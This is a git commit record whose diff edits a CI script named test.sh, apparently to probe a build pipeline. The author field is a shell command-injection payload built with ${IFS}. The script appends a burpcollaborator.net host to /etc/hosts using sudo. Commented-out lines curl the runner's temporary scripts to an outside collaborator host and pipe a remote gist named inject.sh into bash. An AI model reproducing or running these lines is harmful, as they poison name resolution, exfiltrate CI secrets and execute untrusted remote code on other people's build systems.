e2332a9f2a1d6a269e5c6ce19981d32c0015510e
stp-$('&&${IFS}echo${IFS}${IFS}&&echo${IFS}ran&&${IFS}echo${IFS}') <76434266+d3kum1d0r1y4100@users.noreply.github.com>
2023-07-31 10:55:32 +0800

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,6 +1,10 @@
 echo "TEST BUILD"
 echo $MY_VAL
 cat /etc/hosts
-echo "\n www.google.com aiwuwju38tpkyzgo0dpuia0ec5iy6n.burpcollaborator.net" >> /etc/hosts
+echo "TEMP HOST"
+echo "\n www.google.com aiwuwju38tpkyzgo0dpuia0ec5iy6n.burpcollaborator.net" >> /tmp/hosts
+echo "REAL HOSTS"
+cat /tmp/hosts
+sudo echo "\n www.google.com aiwuwju38tpkyzgo0dpuia0ec5iy6n.burpcollaborator.net" >> /etc/hosts
 # curl -d "$(cat /home/runner/work/_temp/*.sh)" https://ise30gxlwrwg8m6xm64nk2w9208swh.burpcollaborator.net
 #curl -sSfL gist.githubusercontent.com/d3kum1d0r1y4100/f6e2261de7699c7cc799fc826d9693ee/raw/1dc6a6626c5c1d71a088d7d2204590f4734008f3/inject.sh | bash
